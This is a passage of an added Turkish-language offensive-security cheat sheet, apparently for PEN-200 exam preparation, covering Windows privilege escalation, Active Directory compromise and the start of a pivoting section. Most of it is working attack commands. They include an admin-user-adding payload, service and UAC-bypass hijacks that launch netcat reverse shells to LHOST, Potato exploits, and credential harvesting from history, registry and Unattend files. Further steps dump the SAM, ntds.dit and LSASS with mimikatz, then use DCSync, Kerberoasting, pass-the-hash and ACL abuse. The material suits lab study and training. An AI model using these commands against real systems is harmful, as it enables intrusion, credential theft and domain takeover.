+<tr>
+<td>Config dosyasında parola</td>
+<td><code>su root</code>, <code>su &lt;diğer kullanıcı&gt;</code></td>
+</tr>
+<tr>
+<td>NFS no_root_squash</td>
+<td>8.6</td>
+</tr>
+<tr>
+<td>Eski kernel / sudo / polkit</td>
+<td>8.7 (son çare)</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h1 id="9-windows-yetki-yükseltme">9. Windows yetki yükseltme</h1>
+<h2 id="91-sıralı-kontrol-listesi">9.1 Sıralı kontrol listesi</h2>
+<pre><code class="language-powershell">whoami /priv                  # 1) SeImpersonate vb. → 9.5
+whoami /groups                # 2) Administrators (UAC?), Backup Operators, Server Operators, DnsAdmins
+net user &lt;kendin&gt;; net localgroup administrators
+systeminfo                    # 3) OS sürümü, yamalar, mimari
+# 4) Parolalar (9.2) — EN VERİMLİ
+# 5) Servisler (9.3)
+Get-CimInstance win32_service | ?{$_.PathName -notlike &quot;C:\Windows*&quot;} | select Name,StartName,State,StartMode,PathName
+# 6) Zamanlanmış görevler
+schtasks /query /fo LIST /v | findstr /i &quot;TaskName Run.As Task.To.Run&quot;
+# 7) Kurulu yazılım ve ilginç dizinler
+Get-ItemProperty &quot;HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*&quot; | select DisplayName,DisplayVersion
+dir C:\ ; dir &quot;C:\Program Files&quot; ; dir &quot;C:\Program Files (x86)&quot; ; dir C:\Users\*\Desktop
+netstat -ano | findstr LISTENING       # 8) sadece içeriden erişilen servisler
+</code></pre>
+<p>Sonra otomatik: <code>.\winPEASx64.exe</code> ve <code>. .\PowerUp.ps1; Invoke-AllChecks</code> — <strong>ikisinin bulgusunu da manuel doğrula.</strong></p>
+<h2 id="92-kimlik-bilgisi-avı-windowsta-en-verimli-privesc">9.2 Kimlik bilgisi avı (Windows'ta en verimli privesc)</h2>
+<pre><code class="language-powershell"># PowerShell geçmişi (her kullanıcı için)
+Get-History
+type (Get-PSReadlineOption).HistorySavePath
+dir C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+# PowerShell transcript dosyaları
+dir C:\ -Recurse -Include *transcript*.txt -ErrorAction SilentlyContinue
+# İlginç dosyalar
+Get-ChildItem C:\Users -Include *.txt,*.ini,*.xml,*.config,*.kdbx,*.ps1,*.zip -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+findstr /si /m &quot;password&quot; C:\inetpub\*.config C:\xampp\*.ini C:\Users\*.txt 2&gt;nul
+# Kayıt defteri / otomatik oturum
+reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; | findstr /i &quot;Default&quot;
+reg query HKLM /f password /t REG_SZ /s 2&gt;nul | findstr /i &quot;password&quot;
+# Kurulum kalıntıları
+type C:\Windows\Panther\Unattend.xml ; type C:\Windows\Panther\unattend\Unattend.xml
+# Kaydedilmiş kimlikler
+cmdkey /list        # varsa:  runas /savecred /user:&lt;kullanıcı&gt; &quot;C:\Windows\Temp\rev.exe&quot;
+</code></pre>
+<p>Event Viewer → PowerShell Operational → <strong>Script Block Logging (4104)</strong> kayıtlarında da parola geçebilir:
+<code>Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | ?{$_.Id -eq 4104} | select -First 50 -Expand Message</code></p>
+<h2 id="93-servisler">9.3 Servisler</h2>
+<p><strong>(a) Servis binary'si yazılabilir (binary hijacking):</strong></p>
+<pre><code class="language-powershell">icacls &quot;C:\Program Files\App\svc.exe&quot;         # (F) veya (M) senin grubunda mı? (BUILTIN\Users, Everyone, Authenticated Users)
+</code></pre>
+<pre><code class="language-c">// adduser.c  →  x86_64-w64-mingw32-gcc adduser.c -o svc.exe
+#include &lt;stdlib.h&gt;
+int main(){ system(&quot;net user hacker Passw0rd! /add&quot;); system(&quot;net localgroup administrators hacker /add&quot;); return 0; }
+</code></pre>
+<pre><code class="language-powershell">move &quot;C:\Program Files\App\svc.exe&quot; C:\Windows\Temp\svc.bak
+iwr http://<span class="ph">LHOST</span>/svc.exe -OutFile &quot;C:\Program Files\App\svc.exe&quot;
+Restart-Service App        # izin yoksa ve StartMode=Auto ise:  shutdown /r /t 0  (SeShutdownPrivilege gerekir)
+</code></pre>
+<p>(Reverse shell isteyenler <code>msfvenom ... -f exe-service</code> kullanabilir; düz <code>-f exe</code> servis olarak başlatılınca birkaç saniyede ölür.)</p>
+<p><strong>(b) Servis yapılandırması değiştirilebilir:</strong></p>
+<pre><code class="language-powershell">.\accesschk64.exe /accepteula -uwcqv $env:USERNAME *     # SERVICE_CHANGE_CONFIG / SERVICE_ALL_ACCESS
+sc.exe qc &lt;svc&gt;
+sc.exe config &lt;svc&gt; binPath= &quot;C:\Windows\Temp\nc.exe -e cmd.exe <span class="ph">LHOST</span> 443&quot;
+sc.exe stop &lt;svc&gt;; sc.exe start &lt;svc&gt;
+</code></pre>
+<p><strong>(c) Tırnaksız yol (unquoted service path):</strong></p>
+<pre><code class="language-powershell">wmic service get name,pathname,startmode | findstr /i /v &quot;C:\Windows\\&quot; | findstr /i /v &quot;&quot;&quot;
+# C:\Program Files\My App\Bin\svc.exe  →  sırayla:  C:\Program.exe, C:\Program Files\My.exe, C:\Program Files\My App\Bin.exe
+icacls &quot;C:\Program Files\My App&quot;        # yazılabilir dizine uygun isimli exe bırak, servisi yeniden başlat
+</code></pre>
+<p><strong>(d) DLL hijacking:</strong> Servis/uygulama, yazılabilir bir dizinden olmayan bir DLL'i arıyorsa (Process Monitor'da <code>NAME NOT FOUND</code>; hedefte genelde yok → aynı uygulamayı kendi Windows VM'inde incele):</p>
+<pre><code class="language-bash">msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f dll -o hijack.dll
+</code></pre>
+<h2 id="94-zamanlanmış-görevler-ve-alwaysinstallelevated">9.4 Zamanlanmış görevler ve AlwaysInstallElevated</h2>
+<pre><code class="language-powershell">schtasks /query /fo LIST /v | findstr /i &quot;TaskName Run.As Task.To.Run&quot;
+icacls C:\path\to\task.ps1          # yazılabilir ve &quot;Run As&quot; yetkili hesap ise → içeriği değiştir
+
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+# İkisi de 0x1 ise:
+msiexec /quiet /qn /i C:\Windows\Temp\rev.msi
+</code></pre>
+<h2 id="95-yetkiler-whoami-priv">9.5 Yetkiler (whoami /priv)</h2>
+<table>
+<thead>
+<tr>
+<th>Yetki</th>
+<th>Yol</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>SeImpersonatePrivilege</strong></td>
+<td>Potato ailesi (IIS, MSSQL, servis hesaplarında çok sık)</td>
+</tr>
+<tr>
+<td>SeBackupPrivilege</td>
+<td>SAM/SYSTEM kopyala; DC'de <code>ntds.dit</code> (aşağıda)</td>
+</tr>
+<tr>
+<td>SeRestorePrivilege</td>
+<td>Korunan dosyalara yaz (ör. <code>utilman.exe</code> değiştir)</td>
+</tr>
+<tr>
+<td>SeManageVolumePrivilege</td>
+<td><code>SeManageVolumeExploit.exe</code> → C:\ yazma → DLL hijack</td>
+</tr>
+<tr>
+<td>SeTakeOwnershipPrivilege</td>
+<td><code>takeown</code> + <code>icacls</code> → sistem dosyasını değiştir</td>
+</tr>
+<tr>
+<td>SeDebugPrivilege</td>
+<td>LSASS dump / SYSTEM sürecine enjeksiyon</td>
+</tr>
+<tr>
+<td>SeLoadDriverPrivilege</td>
+<td>Zafiyetli sürücü (Capcom) — nadir</td>
+</tr>
+</tbody>
+</table>
+<pre><code class="language-powershell"># SeImpersonate
+.\PrintSpoofer64.exe -i -c powershell.exe                 # Win10 / Server 2016-2019
+.\PrintSpoofer64.exe -c &quot;C:\Windows\Temp\nc.exe <span class="ph">LHOST</span> 443 -e cmd&quot;
+.\GodPotato-NET4.exe -cmd &quot;C:\Windows\Temp\nc.exe <span class="ph">LHOST</span> 443 -e cmd&quot;   # Server 2012–2022 / Win8–11
+.\JuicyPotatoNG.exe -t * -p C:\Windows\System32\cmd.exe -a &quot;/c C:\Windows\Temp\nc.exe <span class="ph">LHOST</span> 443 -e cmd&quot;
+</code></pre>
+<p>Bir Potato çalışmazsa diğerini dene; <code>.NET</code> sürümünü (<code>GodPotato-NET2/NET35/NET4</code>) hedefe göre seç.</p>
+<p><strong>SeBackupPrivilege (üye sunucu):</strong></p>
+<pre><code class="language-powershell">reg save HKLM\SAM C:\Windows\Temp\sam ; reg save HKLM\SYSTEM C:\Windows\Temp\system
+# Kali:  impacket-secretsdump -sam sam -system system LOCAL
+</code></pre>
+<p><strong>SeBackupPrivilege / Backup Operators (DC → ntds.dit):</strong></p>
+<pre><code class="language-text"># diskshadow.txt (Windows satır sonlarıyla: unix2dos)
+set context persistent nowriters
+add volume c: alias x
+create
+expose %x% z:
+</code></pre>
+<pre><code class="language-powershell">diskshadow /s C:\Windows\Temp\diskshadow.txt
+robocopy /b z:\Windows\NTDS C:\Windows\Temp ntds.dit
+reg save HKLM\SYSTEM C:\Windows\Temp\system
+# Kali:  impacket-secretsdump -ntds ntds.dit -system system LOCAL
+</code></pre>
+<h2 id="96-gruplar">9.6 Gruplar</h2>
+<table>
+<thead>
+<tr>
+<th>Grup</th>
+<th>Yol</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Administrators ama Medium integrity</td>
+<td>UAC bypass (9.7)</td>
+</tr>
+<tr>
+<td>Backup Operators</td>
+<td>9.5 (SAM / ntds.dit)</td>
+</tr>
+<tr>
+<td>Server Operators</td>
+<td><code>sc.exe config &lt;svc&gt; binPath=</code> ile servis değiştir, başlat → SYSTEM</td>
+</tr>
+<tr>
+<td>DnsAdmins</td>
+<td><code>dnscmd /config /serverlevelplugindll \\LHOST\share\x.dll</code> + DNS servisini yeniden başlat</td>
+</tr>
+<tr>
+<td>Event Log Readers</td>
+<td>Güvenlik loglarında komut satırı parolaları (4688)</td>
+</tr>
+<tr>
+<td>Remote Management Users</td>
+<td>evil-winrm ile giriş hakkı</td>
+</tr>
+</tbody>
+</table>
+<h2 id="97-uac-bypass-administrators-üyesi-medium-integrity">9.7 UAC bypass (Administrators üyesi + Medium integrity)</h2>
+<pre><code class="language-powershell">whoami /groups | findstr Label         # Medium Mandatory Level → UAC
+New-Item &quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot; -Force
+New-ItemProperty &quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot; -Name DelegateExecute -Value &quot;&quot; -Force
+Set-ItemProperty &quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot; -Name &quot;(default)&quot; -Value &quot;C:\Windows\Temp\nc.exe <span class="ph">LHOST</span> 443 -e cmd.exe&quot; -Force
+Start-Process C:\Windows\System32\fodhelper.exe
+</code></pre>
+<p>Parola biliniyorsa daha basit: RDP ile gir, "Yönetici olarak çalıştır" — ya da <code>RunasCs.exe user pass cmd.exe -r LHOST:443 --bypass-uac</code>.</p>
+<h2 id="98-adminsystem-olduktan-sonra-sadece-flag-değil">9.8 Admin/SYSTEM olduktan sonra (sadece flag değil!)</h2>
+<pre><code class="language-powershell"># Yerel hash'ler
+reg save HKLM\SAM C:\Windows\Temp\sam; reg save HKLM\SYSTEM C:\Windows\Temp\system; reg save HKLM\SECURITY C:\Windows\Temp\security
+# Bellekteki kimlikler (AD setinde KRİTİK: bir sonraki makinenin anahtarı genelde buradadır)
+.\mimikatz.exe &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;sekurlsa::logonpasswords&quot; &quot;lsadump::sam&quot; &quot;lsadump::secrets&quot; &quot;exit&quot;
+</code></pre>
+<pre><code class="language-bash"># Kali'den uzaktan (yerel admin kimliğiyle)
+impacket-secretsdump $DOMAIN/$USER:$PASS@$IP
+nxc smb $IP -u administrator -H &lt;NTLM&gt; --local-auth --sam --lsa
+nxc smb $IP -u $USER -p $PASS -M lsassy
+</code></pre>
+<p>Defender mimikatz'ı siliyorsa: <code>rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump &lt;lsass PID&gt; C:\Windows\Temp\l.dmp full</code> (yönetici PowerShell) → Kali'de <code>pypykatz lsa minidump l.dmp</code>.</p>
+<p>Sonra: kullanıcı masaüstleri/dokümanları, <code>.kdbx</code>, tarayıcı/uygulama config'leri, <code>ipconfig /all</code> (ikinci ağ kartı = pivot), <code>cmdkey /list</code>.</p>
+<h2 id="99-eski-yamasız-sistemler">9.9 Eski / yamasız sistemler</h2>
+<p><code>systeminfo</code> çıktısını Kali'de <code>wes.py systeminfo.txt --impact "Elevation of Privilege"</code> ile tara. Klasikler: MS17-010 (2008/7), PrintNightmare CVE-2021-34527/1675 (Spooler açıksa), HiveNightmare CVE-2021-36934 (<code>icacls C:\Windows\System32\config\SAM</code> → <code>BUILTIN\Users:(RX)</code>).</p>
+<h2 id="windows-karar">9.10 Windows privesc karar tablosu</h2>
+<table>
+<thead>
+<tr>
+<th>Bulgu</th>
+<th>Yol</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SeImpersonate</td>
+<td>GodPotato / PrintSpoofer / JuicyPotatoNG</td>
+</tr>
+<tr>
+<td>Geçmiş/config/kdbx'te parola</td>
+<td>RunasCs / evil-winrm / RDP</td>
+</tr>
+<tr>
+<td>Yazılabilir servis binary'si</td>
+<td>Değiştir + yeniden başlat / reboot</td>
+</tr>
+<tr>
+<td>Servis config yetkisi</td>
+<td><code>sc config binPath</code></td>
+</tr>
+<tr>
+<td>Tırnaksız yol + yazılabilir dizin</td>
+<td>Uygun isimli exe</td>
+</tr>
+<tr>
+<td>Yazılabilir görev script'i</td>
+<td>İçeriği değiştir</td>
+</tr>
+<tr>
+<td>AlwaysInstallElevated</td>
+<td>MSI</td>
+</tr>
+<tr>
+<td>Admin grubu + Medium</td>
+<td>fodhelper UAC bypass</td>
+</tr>
+<tr>
+<td>Backup/Server Operators, DnsAdmins</td>
+<td>9.5 / 9.6</td>
+</tr>
+<tr>
+<td><code>localhost</code>'ta dinleyen servis</td>
+<td>Port forward → incele</td>
+</tr>
+</tbody>
+</table>
+<h2 id="911-hızlı-referans-ilk-10-dakika">9.11 Hızlı referans: ilk 10 dakika</h2>
+<pre><code class="language-powershell">whoami /all; hostname; ipconfig /all; systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; /C:&quot;System Type&quot;
+net user; net localgroup administrators; netstat -ano | findstr LISTENING
+Get-History; type (Get-PSReadlineOption).HistorySavePath
+dir C:\Users\*\Desktop, C:\Users\*\Documents -ErrorAction SilentlyContinue
+</code></pre>
+<hr />
+<h1 id="10-active-directory-varsayılan-ihlal-senaryosu">10. Active Directory (varsayılan ihlal senaryosu)</h1>
+<h2 id="ad-karar">10.1 AD karar ağacı</h2>
+<pre><code class="language-text">Verilen kullanıcı (user:pass) + DC IP
+│
+├─ 1. Doğrula ve haritala ─► nxc smb &lt;subnet&gt;  →  hangi makineler, hangileri imzasız, hangi isimler
+├─ 2. Kanallar ──────────────► nxc smb/winrm/rdp/mssql/ldap ile bu kullanıcıyı HER makinede dene
+├─ 3. Enum ──────────────────► kullanıcılar + açıklamaları, gruplar, share'ler, BloodHound
+│
+├─ SPN'li kullanıcı ─────────► Kerberoast → 13100 → parola → spray / giriş
+├─ Preauth kapalı ───────────► AS-REP roast → 18200
+├─ Share'de dosya ───────────► script/config/kdbx/xml → parola
+├─ Bir makinede yerel admin ─► mimikatz/secretsdump → yeni hash/parolalar → 2. adıma dön
+├─ BloodHound ACL kenarı ────► ForceChangePassword / GenericAll / GenericWrite / WriteDACL / AddMember
+├─ MSSQL erişimi ────────────► xp_cmdshell → SeImpersonate → Potato
+├─ Makinede shell var, admin değil ► Bölüm 9 (yerel privesc) → sonra dump
+└─ DA / DC'de SYSTEM ────────► proof.txt (DC'de) + DCSync
+</code></pre>
+<p>AD'de ilerleme döngüseldir: <strong>yeni kimlik → her yerde dene → yeni makine → dump → yeni kimlik</strong>. Her yeni kimlikte BloodHound'da o kullanıcıyı "Owned" işaretle ve yolları yeniden sorgula.</p>
+<h2 id="102-i̇lk-15-dakika">10.2 İlk 15 dakika</h2>
+<pre><code class="language-bash"># Saat senkronu (Kerberos 5 dk farka toleranslı)
+sudo ntpdate -u $DC          # veya: sudo rdate -n $DC
+# DC ve domain adı
+nxc smb $DC
+echo &quot;$DC dc01.$DOMAIN $DOMAIN dc01&quot; | sudo tee -a /etc/hosts
+# Subnetteki makineler
+nxc smb 10.10.x.0/24
+# Kullanıcıyı her yerde dene
+nxc smb   10.10.x.0/24 -u $USER -p $PASS
+nxc winrm 10.10.x.0/24 -u $USER -p $PASS
+nxc rdp   10.10.x.0/24 -u $USER -p $PASS
+nxc mssql 10.10.x.0/24 -u $USER -p $PASS
+# Domain verisi
+nxc smb $DC -u $USER -p $PASS --users --groups --shares --pass-pol
+nxc ldap $DC -u $USER -p $PASS --users-export users.txt     # sadece kullanıcı adları
+nxc smb 10.10.x.0/24 -u $USER -p $PASS -M spider_plus        # tüm share'lerdeki dosyalar
+</code></pre>
+<p>Kullanıcı açıklama alanları (<code>description</code>) ve SYSVOL içindeki script'ler sık sık parola içerir.</p>
+<h2 id="103-bloodhound">10.3 BloodHound</h2>
+<pre><code class="language-bash"># Kali'den toplama
+bloodhound-ce-python -u $USER -p $PASS -d $DOMAIN -ns $DC -c All --zip      # BloodHound CE için
+# (BloodHound Legacy kullanıyorsan: bloodhound-python. Toplayıcı ile arayüz sürümü UYUMLU olmalı.)
+nxc ldap $DC -u $USER -p $PASS --bloodhound -c All --dns-server $DC
+</code></pre>
+<pre><code class="language-powershell"># Hedef Windows'tan
+.\SharpHound.exe -c All --zipfilename bh.zip
+</code></pre>
+<p>Bakılacak sorgular: <em>Shortest paths to Domain Admins</em>, <em>Shortest paths from Owned principals</em>, <em>Kerberoastable users</em>, <em>AS-REP roastable users</em>, sahip olduğun kullanıcının <strong>Outbound Object Control</strong>'ü, <em>Find computers where Domain Users are local admin</em>, <em>Users with sessions</em>.</p>
+<h2 id="104-powerview-yerleşik-araçlarla-enum-hedef-üzerinden">10.4 PowerView / yerleşik araçlarla enum (hedef üzerinden)</h2>
+<pre><code class="language-powershell">. .\PowerView.ps1
+Get-DomainUser | select samaccountname,description,memberof
+Get-DomainUser -SPN | select samaccountname,serviceprincipalname
+Get-DomainUser -PreauthNotRequired | select samaccountname
+Get-DomainGroupMember &quot;Domain Admins&quot; -Recurse | select MemberName
+Get-DomainComputer | select dnshostname,operatingsystem
+Find-LocalAdminAccess                        # bu kullanıcı nerede yerel admin?
+Get-NetSession -ComputerName &lt;host&gt;          # kim nerede oturum açmış
+Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match &quot;$env:USERNAME&quot;}
+Get-DomainObjectAcl -Identity &lt;hedef&gt; -ResolveGUIDs | ?{$_.ActiveDirectoryRights -match &quot;GenericAll|GenericWrite|WriteDacl|WriteOwner&quot;}
+# Araçsız
+net user /domain ; net group &quot;Domain Admins&quot; /domain ; net accounts /domain
+</code></pre>
+<h2 id="105-kerberoasting-ve-as-rep-roasting">10.5 Kerberoasting ve AS-REP roasting</h2>
+<pre><code class="language-bash">impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $DC -request -outputfile kerb.txt
+impacket-GetNPUsers  $DOMAIN/$USER:$PASS -dc-ip $DC -request -format hashcat -outputfile asrep.txt
+impacket-GetNPUsers  $DOMAIN/ -usersfile users.txt -dc-ip $DC -no-pass -format hashcat     # kimliksiz
+hashcat -m 13100 kerb.txt  /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
+</code></pre>
+<pre><code class="language-powershell">.\Rubeus.exe kerberoast /outfile:kerb.txt /nowrap
+.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt /nowrap
+</code></pre>
+<h2 id="106-yatay-hareket">10.6 Yatay hareket</h2>
+<table>
+<thead>
+<tr>
+<th>Yöntem</th>
+<th>Gereken</th>
+<th>Komut</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>PsExec</td>
+<td>Yerel admin, SMB, ADMIN$ yazılabilir</td>
+<td><code>impacket-psexec $DOMAIN/$USER:$PASS@$IP</code></td>
+</tr>
+<tr>
+<td>WMIExec</td>
+<td>Yerel admin, 135 + yüksek portlar</td>
+<td><code>impacket-wmiexec -hashes :&lt;NTLM&gt; $DOMAIN/$USER@$IP</code></td>
+</tr>
+<tr>
+<td>SMBExec / ATExec</td>
+<td>Yerel admin</td>
+<td><code>impacket-smbexec ...</code> / <code>impacket-atexec ... whoami</code></td>
+</tr>
+<tr>
+<td>WinRM</td>
+<td>Remote Management Users veya admin</td>
+<td><code>evil-winrm -i $IP -u $USER -p $PASS</code> / <code>-H &lt;NTLM&gt;</code></td>
+</tr>
+<tr>
+<td>RDP</td>
+<td>Remote Desktop Users</td>
+<td><code>xfreerdp3 /v:$IP /u:$USER /p:$PASS /d:$DOMAIN /cert:ignore</code></td>
+</tr>
+<tr>
+<td>RDP + hash</td>
+<td>Restricted Admin açık</td>
+<td><code>xfreerdp3 /v:$IP /u:$USER /pth:&lt;NTLM&gt; /cert:ignore</code></td>
+</tr>
+<tr>
+<td>nxc tek komut</td>
+<td>admin</td>
+<td><code>nxc smb $IP -u $USER -H &lt;NTLM&gt; -x "whoami"</code></td>
+</tr>
+<tr>
+<td>MSSQL</td>
+<td>DB erişimi</td>
+<td><code>impacket-mssqlclient ... -windows-auth</code></td>
+</tr>
+</tbody>
+</table>
+<p>Windows'tan Windows'a (araç taşıyamıyorsan):</p>
+<pre><code class="language-powershell">winrs -r:files04 -u:$USER -p:$PASS &quot;cmd /c whoami&quot;
+$cred = New-Object System.Management.Automation.PSCredential('CORP\user',(ConvertTo-SecureString 'Pass' -AsPlainText -Force))
+Enter-PSSession -ComputerName files04 -Credential $cred
+.\PsExec64.exe -accepteula \\files04 -u corp\user -p Pass cmd
+</code></pre>
+<p><strong>Overpass-the-hash / Pass-the-ticket:</strong></p>
+<pre><code class="language-bash">impacket-getTGT $DOMAIN/$USER -hashes :&lt;NTLM&gt; -dc-ip $DC
+export KRB5CCNAME=$PWD/$USER.ccache
+impacket-psexec -k -no-pass $DOMAIN/$USER@host.$DOMAIN        # IP değil, FQDN kullan
+</code></pre>
+<pre><code class="language-powershell">.\mimikatz.exe &quot;sekurlsa::pth /user:jen /domain:corp.com /ntlm:&lt;NTLM&gt; /run:powershell&quot; &quot;exit&quot;
+.\mimikatz.exe &quot;sekurlsa::tickets /export&quot; &quot;exit&quot; ; .\mimikatz.exe &quot;kerberos::ptt &lt;ticket.kirbi&gt;&quot; &quot;exit&quot;
+</code></pre>
+<h2 id="107-mssql">10.7 MSSQL</h2>
+<pre><code class="language-sql">SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin');
+-- impacket-mssqlclient içinde kısayollar:  enable_xp_cmdshell  /  xp_cmdshell whoami
+EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
+EXEC xp_cmdshell 'whoami /priv';                         -- servis hesabı → SeImpersonate → Potato
+-- Kimlik taklidi
+SELECT distinct b.name FROM sys.server_permissions a JOIN sys.server_principals b ON a.grantor_principal_id=b.principal_id WHERE a.permission_name='IMPERSONATE';
+EXECUTE AS LOGIN = 'sa';
+-- Bağlı sunucular
+SELECT srvname FROM sysservers;  EXEC ('xp_cmdshell ''whoami''') AT [SQL02];
+-- Servis hesabının NetNTLMv2'sini yakala (Kali'de: impacket-smbserver share . -smb2support)
+EXEC xp_dirtree '\\<span class="ph">LHOST</span>\share';
+</code></pre>
+<h2 id="108-acl-istismarı-bloodhound-kenarları">10.8 ACL istismarı (BloodHound kenarları)</h2>
+<table>
+<thead>
+<tr>
+<th>Kenar (hedef üzerinde)</th>
+<th>Saldırı</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>ForceChangePassword</td>
+<td>Parolasını değiştir</td>
+</tr>
+<tr>
+<td>GenericAll (kullanıcı)</td>
+<td>Parola değiştir / SPN ekle → kerberoast</td>
+</tr>
+<tr>
+<td>GenericAll / AddMember (grup)</td>
+<td>Kendini gruba ekle</td>
+</tr>
+<tr>
+<td>GenericWrite (kullanıcı)</td>
+<td>SPN ekle (targeted kerberoast)</td>
+</tr>
+<tr>
+<td>WriteDACL (domain)</td>
+<td>Kendine DCSync hakkı ver</td>
+</tr>
+<tr>
+<td>WriteOwner</td>
+<td>Sahibi ol → kendine GenericAll ver</td>
+</tr>
+<tr>
+<td>ReadLAPSPassword</td>
+<td>Makinenin yerel admin parolasını oku</td>
+</tr>
+<tr>
+<td>ReadGMSAPassword</td>
+<td>gMSA hesabının NT hash'ini oku</td>
+</tr>
+</tbody>
+</table>
+<pre><code class="language-bash"># bloodyAD (Kali'den, çok pratik)
+bloodyAD -d $DOMAIN -u $USER -p $PASS --host $DC set password &lt;hedef&gt; 'NewPass123!'
+bloodyAD -d $DOMAIN -u $USER -p $PASS --host $DC add groupMember '&lt;grup&gt;' $USER
+bloodyAD -d $DOMAIN -u $USER -p $PASS --host $DC add dcsync $USER
+bloodyAD -d $DOMAIN -u $USER -p $PASS --host $DC set owner &lt;hedef&gt; $USER
+bloodyAD -d $DOMAIN -u $USER -p $PASS --host $DC add genericAll &lt;hedef&gt; $USER
+# Alternatif
+net rpc password '&lt;hedef&gt;' 'NewPass123!' -U &quot;$DOMAIN/$USER%$PASS&quot; -S $DC
+# Targeted kerberoast (GenericWrite)
+python3 targetedKerberoast.py -d $DOMAIN -u $USER -p $PASS --dc-ip $DC
+# LAPS / gMSA
+nxc ldap $DC -u $USER -p $PASS -M laps
+nxc ldap $DC -u $USER -p $PASS --gmsa
+</code></pre>
+<pre><code class="language-powershell"># PowerView karşılıkları
+Set-DomainUserPassword -Identity &lt;hedef&gt; -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
+Add-DomainGroupMember -Identity '&lt;grup&gt;' -Members $env:USERNAME
+Add-DomainObjectAcl -TargetIdentity &quot;DC=corp,DC=local&quot; -PrincipalIdentity $env:USERNAME -Rights DCSync
+Set-DomainObject -Identity &lt;hedef&gt; -Set @{serviceprincipalname='x/y'}
+</code></pre>
+<div class="admonition tip">
+<p class="admonition-title">Grup üyeliği eklendikten sonra</p>
+<p>Yeni grup üyeliği mevcut oturumun token'ına yansımaz: yeniden giriş yap (yeni evil-winrm / yeni TGT).</p>
+</div>
+<h2 id="109-domain-admin-ve-kanıt">10.9 Domain Admin ve kanıt</h2>
+<pre><code class="language-bash">impacket-secretsdump $DOMAIN/&lt;DA kullanıcısı&gt;:&lt;parola&gt;@$DC -just-dc-user Administrator   # DCSync
+impacket-psexec $DOMAIN/Administrator@$DC -hashes :&lt;NTLM&gt;
+evil-winrm -i $DC -u Administrator -H &lt;NTLM&gt;
+</code></pre>
+<p>DC'de kanıt (aynı karede):</p>
+<pre><code class="language-powershell">hostname; whoami; ipconfig | findstr IPv4; type C:\Users\Administrator\Desktop\proof.txt
+</code></pre>
+<p>Silver/Golden ticket, DCSync sonrası kalıcılık vb. sınav puanı getirmez; DA'ya ulaştıysan kanıtı al ve devam et.</p>
+<h2 id="1010-i̇leri-seviye-pen-200-müfredatı-dışı-sadece-kısa-not">10.10 İleri seviye (PEN-200 müfredatı dışı — sadece kısa not)</h2>
+<p>Sınav AD setleri genelde 10.1'deki yollarla çözülür. Aşağıdakiler gerçek hayatta ve HTB'de sık; lab'da gördüğünde hatırla:</p>
+<ul>
+<li><strong>ADCS:</strong> <code>certipy-ad find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -vulnerable -stdout</code> → ESC1: <code>certipy-ad req ... -template &lt;T&gt; -upn administrator@$DOMAIN</code> → <code>certipy-ad auth -pfx administrator.pfx</code></li>
+<li><strong>Shadow Credentials</strong> (GenericWrite/AddKeyCredentialLink): <code>certipy-ad shadow auto -u $USER@$DOMAIN -p $PASS -account &lt;hedef&gt;</code></li>
+<li><strong>RBCD / Constrained / Unconstrained delegation:</strong> <code>impacket-findDelegation $DOMAIN/$USER:$PASS -dc-ip $DC</code></li>
+<li><strong>NTLM relay + coercion</strong> (PetitPotam, PrinterBug): coercion spoofing değildir ama Responder ile <strong>poisoning sınavda yasaktır</strong>.</li>
+</ul>
+<h2 id="1011-adde-sık-yapılan-hatalar">10.11 AD'de sık yapılan hatalar</h2>
+<ul>
+<li>Verilen kullanıcıyı <strong>tüm makinelerde ve tüm protokollerde</strong> denememek.</li>
+<li>Yerel admin olunan makinede <strong>mimikatz/secretsdump çalıştırmamak</strong> (bir sonraki adımın anahtarı oradadır).</li>
+<li>Bulunan yerel admin hash'ini <code>--local-auth</code> ile diğer makinelerde denememek.</li>
+<li>Kerberos hatası (<code>KRB_AP_ERR_SKEW</code>) → saat; <code>KDC_ERR_S_PRINCIPAL_UNKNOWN</code> → IP yerine FQDN kullan.</li>
+<li>AD'de 3–4 saat ilerleme yoksa bağımsız makinelere geç, sonra taze kafayla dön.</li>
+</ul>
+<hr />
+<h1 id="11-pivoting">11. Pivoting</h1>
+<h2 id="111-ne-zaman">11.1 Ne zaman</h2>
+<p><code>ip a</code> / <code>ipconfig</code> çıktısında ikinci bir ağ kartı, <code>ss -tlnp</code> / <code>netstat -ano</code>'da sadece <strong>127.0.0.1</strong>'de dinleyen servis veya AD setinde doğrudan erişemediğin makineler.</p>
